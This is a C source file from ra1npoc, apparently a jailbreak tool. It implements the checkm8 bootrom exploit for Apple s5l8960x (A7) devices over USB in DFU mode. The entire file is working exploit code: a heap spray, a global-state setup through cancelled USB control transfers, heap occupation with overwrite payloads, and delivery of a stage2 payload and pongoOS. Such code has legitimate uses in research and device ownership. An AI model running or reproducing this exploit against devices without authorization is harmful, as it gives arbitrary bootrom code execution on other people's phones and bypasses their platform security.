/*
 * ra1npoc - s5l8960x.c .. exploit for s5l8960x
 *
 * Copyright (c) 2021 dora2ios
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

#include <io/iousb.h>
#include <common/common.h>

static unsigned char blank[2048];

unsigned char yolo[] = {
    0x79, 0x6f, 0x6c, 0x6f
};

static void heap_spray(io_client_t client)
{
    transfer_t result;
    
    memset(&blank, '\0', 2048);
    
    result = usb_req_stall(client);
    DEBUGLOG("[%s] (1/4) %x", __FUNCTION__, result.ret);
    usleep(100000);
    
    result = usb_req_no_leak(client, blank);
    DEBUGLOG("[%s] (2/4) %x", __FUNCTION__, result.ret);
    usleep(10000);
    
#ifdef IPHONEOS_ARM
    for(int i=0;i<7938;i++){
        result = usb_req_leak(client, blank);
    }
#else
    async_transfer_t transfer;
    memset(&transfer, '\0', sizeof(async_transfer_t));
    
    int usleep_time = 100;
    for(int i=0; i<7938; i++){
        result = usb_req_leak_with_async(client, blank, usleep_time, transfer);
    }
#endif
    DEBUGLOG("[%s] (3/4) %x", __FUNCTION__, result.ret);
    usleep(10000);
    
    result = usb_req_no_leak(client, blank);
    DEBUGLOG("[%s] (4/4) %x", __FUNCTION__, result.ret);
}

static void set_global_state(io_client_t client)
{
    transfer_t result;
    unsigned int val;
    UInt32 sent;
    
    memset(&blank, '\x41', 2048);
    
    val = 1408; // A7/A9X/A10/A10X/A11
    
    /* val haxx
     * If async_transfer sent size = 64 byte, then pushval size = 1408 byte. And, it is possible to try again a few times and wait until sent = 64
     * However, even if sent != 64, it succeeds by subtracting the value from pushval.
     * add 64 byte from pushval, then subtract sent from it.
     */
    
    int i=0;
    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, 2048, 0)) >= val){
        i++;
        DEBUGLOG("[%s] (*) retry: %x\n", __FUNCTION__, i);
        usleep(10000);
        result = send_data(client, blank, 64); // send blank data and redo the request.
        DEBUGLOG("[%s] (*) %x\n", __FUNCTION__, result.ret);
        usleep(10000);
    }
    
    val += 0x40;
    val -= sent;
    DEBUGLOG("[%s] (1/3) sent: %x, val: %x", __FUNCTION__, (unsigned int)sent, val);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, blank, val, 100);
    DEBUGLOG("[%s] (2/3) %x", __FUNCTION__, result.ret);
    
    heap_spray(client);
    
    result = send_abort(client);
    DEBUGLOG("[%s] (3/3) %x", __FUNCTION__, result.ret);
}

static void heap_occupation(io_client_t client, checkra1n_payload_t payload)
{
    transfer_t result;
    
    memset(&blank, '\0', 2048);
    
    result = usb_req_stall(client);
    DEBUGLOG("[%s] (1/7) %x", __FUNCTION__, result.ret);
    usleep(10000);
    
    for(int i=0;i<3;i++){
        result = usb_req_leak(client, blank);
        DEBUGLOG("[%s] (%d/7) %x", __FUNCTION__, 1+(i+1), result.ret);
    }
    usleep(10000);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over1, payload.over1_len, 100);
    DEBUGLOG("[%s] (5/7) %x", __FUNCTION__, result.ret);
    result = send_data_with_time(client, yolo, 4, 100);
    DEBUGLOG("[%s] (6/7) %x", __FUNCTION__, result.ret);
    result = send_data_with_time(client, payload.over2, payload.over2_len, 100);
    DEBUGLOG("[%s] (7/7) %x", __FUNCTION__, result.ret);
}

int checkm8_s5l8960x(io_client_t client, checkra1n_payload_t payload)
{
    int ret = 0;
    
    memset(&blank, '\0', 2048);
    
    LOG_EXPLOIT_NAME("checkm8");
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 1000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }

    LOG("[%s] running set_global_state()", __FUNCTION__);
    set_global_state(client);
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 10000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG("[%s] running heap_occupation()", __FUNCTION__);
    heap_occupation(client, payload);
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_REENUMERATE, false, 10000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG("[%s] checkmate!", __FUNCTION__);
    
    if(payload.stage2_len != 0) {
        LOG("[%s] sending stage2 payload", __FUNCTION__);
        usleep(10000);
        ret = payload_stage2(client, payload);
        if(ret != 0){
            ERROR("[%s] ERROR: Failed to send stage2", __FUNCTION__);
            return -1;
        }
    }
    
    if(payload.pongoOS_len != 0) {
        usleep(10000);
        LOG("[%s] connecting to stage2", __FUNCTION__);
        ret = connect_to_stage2(client, payload);
        if(ret != 0){
            return -1; // err
        }
    }
    
    return 0;
}
